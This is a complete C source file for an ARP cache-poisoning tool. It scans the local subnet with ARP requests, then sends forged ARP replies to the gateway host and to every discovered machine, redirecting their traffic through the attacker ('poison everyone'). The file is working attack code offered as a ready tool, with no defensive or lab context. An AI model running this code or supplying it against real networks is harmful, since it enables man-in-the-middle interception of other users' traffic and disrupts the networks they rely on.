#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <err.h>
#include <pcap.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <netpacket/packet.h>
#include <net/if.h>
#include <netinet/ip_icmp.h>
#include <netinet/if_ether.h>
#include <netinet/tcp.h>

#define FAIL     -1
#define ARPSIZ   42 
#define IPSLEN   20
#define IP_ALEN  4
#define MACSLEN  25
#define NPACKS   20
#define SDELAY   500
#define STIMEOUT 7 

struct ip_mac {
    uint8_t ip[IP_ALEN];
    uint8_t mac[ETH_ALEN];
    struct ip_mac *next;
};

void print_usage(char *);
void destroy_pairs(struct ip_mac *);
void mac_to_str(char *, uint8_t[]);
struct ip_mac *ip_sweep(int, int, uint8_t[],
                                  uint8_t[]);
int is_valid_ip(char *);
int get_if_info(int, char[], struct ifreq *,
                             struct ifreq *,
                             struct ifreq *);
int send_arp(int, int, uint8_t[], 
                       uint8_t[], 
                       uint8_t[], 
                       uint8_t[], 
                       uint8_t[], 
                       uint8_t[], 
                       unsigned short int);

uint8_t broadcast[] = "\xff\xff\xff\xff\xff\xff";
uint8_t empty[]     = "\x00\x00\x00\x00\x00\x00";


int main(int argc, char **argv) {
    char dev[IFNAMSIZ];
    char our_m_str[MACSLEN], target_m_str[MACSLEN], host_m_str[MACSLEN];
    char our_ip_str[IPSLEN], host_str[IPSLEN]; 
    struct ifreq ifreq_i, ifreq_c, ifreq_ip;
    uint8_t our_mac[ETH_ALEN], target_mac[ETH_ALEN], host_mac[ETH_ALEN];
    uint8_t our_ip[IP_ALEN], host_ip[IP_ALEN], target_ip[IP_ALEN];
    int sock;

    // create raw socket
    if ((sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
        if (getuid() != 0) {
            fprintf(stderr, "Run again as sudo! (sudo %s)\n", argv[0]);
            exit(1);
        }
        err(1, "Error : raw sock create failed");
    }

    // set defaults
    int num_packets = NPACKS;
    int sufix       = 1;

    // get optional arguments
    int op           = 0;
    int dev_from_arg = 0;
    while ((op = getopt(argc, argv, "h:n:i:")) != FAIL) {
        switch (op) {

            case 'i':
                // set interface option 
                dev_from_arg = 1;

                if (strlen(optarg) > IFNAMSIZ) {
                    fprintf(stderr, "Error : Interface name %s too long (try renaming it)\n", optarg);
                    exit(1);
                }
                strncpy(dev, optarg, IFNAMSIZ);
                dev[strlen(optarg)] = 0;
                break;

            case 'h':
                // host sufix option
                if ((sufix = atoi(optarg)) > 254) {
                    fprintf(stderr, "Error : host sufix %d too high (over 254)\n", sufix);
                    exit(1);
                }
                break;

            case 'n':
                // num-packets option
                num_packets = atoi(optarg);
                break;

            default:
                print_usage(argv[0]);
                break;
        }
    }

    // get default interface if no option set
    if (!dev_from_arg) {
        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_if_t *devs;

        // get default interface
        if (pcap_findalldevs(&devs, errbuf) == FAIL) {
            err(1, "Error : could not default interface, please enter one");
        }
        if (devs == NULL) {
            fprintf(stderr, "Error : could not default interface, please enter one (with option -i)\n");
            exit(1);
        }
        int len = strlen(devs->name);

        if (len > IFNAMSIZ) {
            fprintf(stderr, "Error : Default interface name %s too long (try renaming it)\n", devs->name);
            exit(1);
        }
        strncpy(dev, devs->name, IFNAMSIZ);
        dev[len] = 0;
    }

    // get interface info
    if(get_if_info(sock, dev, &ifreq_i, &ifreq_c, &ifreq_ip) == FAIL) {
        err(1, "Error : Failed to get info for interface %s (you probably chose the wrong one, try ifconfig or google)", dev);
    }

    // save interface info 
    memcpy(our_mac, (uint8_t *)(ifreq_c.ifr_hwaddr.sa_data), ETH_ALEN);
    mac_to_str(our_m_str, our_mac); 
    memcpy(our_ip, (void *)&(((struct sockaddr_in *)&(ifreq_ip.ifr_addr))->sin_addr), IP_ALEN);
    sprintf(our_ip_str, "%d.%d.%d.%d\n", 
            our_ip[0], 
            our_ip[1],
            our_ip[2],
            our_ip[3]); 
    
    // get/check host ip
    memcpy(host_ip, our_ip, IP_ALEN);
    host_ip[3] = sufix;
    sprintf(host_str, "%d.%d.%d.%d", 
            host_ip[0], 
            host_ip[1], 
            host_ip[2], 
            host_ip[3]);

    if (!is_valid_ip(host_str)) {
        err(1, "Error %s is not a vaild ip address", host_str);
    }

    // scan network for targets 
    struct ip_mac *ip_mac_pairs = ip_sweep(sock, ifreq_i.ifr_ifindex, our_ip, our_mac);

    // save host mac
    struct ip_mac *p   = ip_mac_pairs;
    struct ip_mac *prv = NULL;
    while (1) {
        if (p->ip[3] == sufix) {
            memcpy(host_mac, p->mac, ETH_ALEN);
            mac_to_str(host_m_str, host_mac);

            // remove host from linked list
            if (prv) {
                prv->next = p->next;
            }
            else {
                ip_mac_pairs = p->next;
            }
            free(p);
            break;
        }            
        if (p->next == NULL) {
            destroy_pairs(ip_mac_pairs);
            fprintf(stderr, "Could not get host %s MAC\n", host_str);
            exit(1);
        }
        prv = p;
        p   = p->next;
    }

    // poison everyone
    int h = 0;
    for (p = ip_mac_pairs; p != NULL; p = p->next) {
                
        memcpy(target_ip, p->ip, IP_ALEN);
        memcpy(target_mac, p->mac, ETH_ALEN);
        mac_to_str(target_m_str, target_mac);

        printf("\nTarget %d: %d.%d.%d.%d\n\n", ++h, 
                p->ip[0],
                p->ip[1],
                p->ip[2],
                p->ip[3]);

        // poison host
        printf("Poisoning host %s...\n", host_str);
        int pkts = num_packets;
        while (pkts--) {
            send_arp(sock, ifreq_i.ifr_ifindex, 
                    our_mac,      // eth source mac
                    host_mac,     // eth dest mac
                    our_mac,      // arp source mac
                    host_mac,     // arp target mac
                    target_ip,    // arp source ip
                    host_ip,      // arp target ip
                    ARPOP_REPLY); // opcode

            sleep(1);
            printf("H:(%s) ---> U:(%s) ---> T:(%s)\n",
                    host_m_str,
                    our_m_str,
                    target_m_str);
        }

        // poison target 
        printf("\nPoisoning target %d.%d.%d.%d ...\n", 
                p->ip[0],
                p->ip[1],
                p->ip[2],
                p->ip[3]);

        pkts = num_packets;
        while (pkts--) {
            send_arp(sock, ifreq_i.ifr_ifindex, 
                    our_mac,      // eth source mac
                    target_mac,   // eth dest mac
                    our_mac,      // arp source mac
                    target_mac,   // arp target mac
                    host_ip,      // arp source ip 
                    target_ip,    // arp target ip
                    ARPOP_REPLY); // opcode 


            sleep(1);
            printf("H:(%s) <--- U:(%s) <--- T:(%s)\n",
                    target_m_str,
                    our_m_str,
                    host_m_str);
        }
    }
    destroy_pairs(ip_mac_pairs);
    exit(0);
}

void print_usage(char *pname) {
    fprintf(stderr, "Usage: (sudo) %s [-i interface] [-h host-sufix (default 1)] [-n num-packets (default 20)]\n", pname);
    exit(1);
}

void destroy_pairs(struct ip_mac *head) {
    if (head == NULL) {
        return;
    }
    destroy_pairs(head->next);
    free(head);
}

struct ip_mac *add_ip_mac(struct ip_mac *head, uint8_t ip[IP_ALEN],
                                               uint8_t mac[ETH_ALEN]) {
    struct ip_mac *new;

    if (!(new = malloc(sizeof(struct ip_mac)))) {
        err(1, "Error : malloc struct in %s == NULL", __FUNCTION__);
    }

    memcpy(new->ip, ip, IP_ALEN);
    memcpy(new->mac, mac, ETH_ALEN);

    new->next = head;
    return new;
}

struct ip_mac *ip_sweep(int sock, int if_idx, uint8_t s_ip[IP_ALEN], 
                                              uint8_t s_mac[ETH_ALEN]) {
    uint8_t t_ip[IP_ALEN];

    struct ip_mac *ip_mac_pairs = NULL;

    memcpy(t_ip, s_ip, IP_ALEN);
    
    // spam ARP requests
    printf("sweep scan ...\n");

    int i = 0xff;
    while (i--) {
        t_ip[3] = i;
        send_arp(sock, if_idx, s_mac,
                broadcast,
                s_mac,
                empty,
                s_ip,
                t_ip,
                ARPOP_REQUEST);
        usleep(SDELAY);
    }

    // wait STIMEOUT for ARP relpies
    time_t endwait;
    time_t start       = time(NULL);
    time_t seconds     = STIMEOUT;

    uint8_t *buf;
    if (!(buf = malloc(ARPSIZ))) {
        err(1, "Error : malloc buf in %s == NULL", __FUNCTION__);
    }

    endwait = start + seconds;

    int n_h = 0;
    while (start < endwait) {
        printf("%d seconds left...\r", (int)(endwait - start));
        fflush(stdout);

        if ((read(sock, buf, ARPSIZ)) < 0) {
            destroy_pairs(ip_mac_pairs);
            err(1, "Error : sock read failed");
        }

        if (ntohs(((struct ethhdr*)(buf))->h_proto) == ETH_P_ARP) {
            struct ether_arp *arp = (struct ether_arp *)(buf + sizeof(struct ethhdr));

            if (ntohs(arp->ea_hdr.ar_op) == ARPOP_REPLY) {
                ip_mac_pairs = add_ip_mac(ip_mac_pairs, arp->arp_spa, arp->arp_sha);
                
                printf("IP %d.%d.%.d.%-3d is up: %d up\n", 
                        t_ip[0], 
                        t_ip[1], 
                        t_ip[2], 
                        arp->arp_spa[3], 
                        ++n_h);
            }
        }
        start = time(NULL);
    }
    printf("\n%d targets up (ignoring host)\n", n_h);
    return ip_mac_pairs;
}

void mac_to_str(char mac_str[MACSLEN], uint8_t mac[ETH_ALEN]) {
    snprintf(mac_str, MACSLEN, "%.2X-%.2X-%.2X-%.2X-%.2X-%.2X", 
                                               mac[0],
                                               mac[1],
                                               mac[2],
                                               mac[3],
                                               mac[4],
                                               mac[5]);
}

int get_if_info(int sock, char dev[IFNAMSIZ], struct ifreq *ifreq_i,
                                              struct ifreq *ifreq_c,
                                              struct ifreq *ifreq_ip) {

    // get index number 
    memset(ifreq_i, 0, sizeof(struct ifreq));
    strncpy(ifreq_i->ifr_name, dev, IFNAMSIZ-1);
   
    if ((ioctl(sock, SIOCGIFINDEX, ifreq_i)) == FAIL) {
        fprintf(stderr, "Error : %s ioctl index read failed\n", dev);
        return FAIL;
    }

    // get MAC Address
    memset(ifreq_c, 0, sizeof(struct ifreq));
    strncpy(ifreq_c->ifr_name, dev, IFNAMSIZ-1);

    if ((ioctl(sock, SIOCGIFHWADDR, ifreq_c)) == FAIL) {
        fprintf(stderr, "Error : %s ioctl MAC read failed\n", dev);
        return FAIL;
    }

    //get IP Address
    memset(ifreq_ip, 0, sizeof(struct ifreq));
    strncpy(ifreq_ip->ifr_name, dev, IFNAMSIZ-1);

    if(ioctl(sock, SIOCGIFADDR, ifreq_ip) == FAIL) {
        fprintf(stderr, "Error : %s ioctl IP read failed\n", dev);
        return FAIL;
    }
    return 0;
}

int is_valid_ip(char *ip) {
    struct sockaddr_in sa;
    int result = inet_pton(AF_INET, ip, &sa);
    return result > 0;
}

int send_arp(int sock, int if_idx, uint8_t s_mac[ETH_ALEN], 
                                   uint8_t d_mac[ETH_ALEN], 
                                   uint8_t arp_s_mac[ETH_ALEN], 
                                   uint8_t arp_t_mac[ETH_ALEN], 
                                   uint8_t arp_s_ip[IP_ALEN], 
                                   uint8_t arp_t_ip[IP_ALEN], 
                                   unsigned short int opcode) {
    int send_len;
    uint8_t *sendbuf;

    if (!(sendbuf = malloc(ARPSIZ))) {
        err(1, "malloc buf in %s == NULL", __FUNCTION__);
    }

    // cast packet start to ethernet header
    struct ethhdr *eth = (struct ethhdr *)(sendbuf);

    // add interface/dest MAC and protocol
    memcpy(eth->h_source, s_mac, ETH_ALEN);
    memcpy(eth->h_dest, d_mac, ETH_ALEN);
    eth->h_proto = htons(ETH_P_ARP);

    // cast next section to ARP header 
    struct ether_arp *arp = (struct ether_arp *)(sendbuf + sizeof(struct ether_header));
     
    // add ARP source/target MAC
    memcpy(arp->arp_sha, arp_s_mac, ETH_ALEN);
    memcpy(arp->arp_tha, arp_t_mac, ETH_ALEN);
    
    // add ARP source/target IP
    memcpy(arp->arp_spa, arp_s_ip, 4);
    memcpy(arp->arp_tpa, arp_t_ip, 4);

    // set hardware type, protocol and opcode
    arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp->ea_hdr.ar_pro = htons(ETH_P_IP);
    arp->ea_hdr.ar_op  = htons(opcode);
    
    // number of bytes in MAC/IP addresses
    arp->ea_hdr.ar_hln = ETH_ALEN;   
    arp->ea_hdr.ar_pln = 4;

    // 
    struct sockaddr_ll sadr_ll;
    sadr_ll.sll_ifindex = if_idx;
    sadr_ll.sll_halen   = ETH_ALEN;
    memcpy(sadr_ll.sll_addr, d_mac, ETH_ALEN);

    // send
    if ((send_len = sendto(sock, sendbuf, ARPSIZ, 0, (const struct sockaddr*)&sadr_ll, sizeof(struct sockaddr_ll))) < 0) {
        fprintf(stderr, "Error : sending ARP failed\n");
        return FAIL;
    }
    return 0;
}


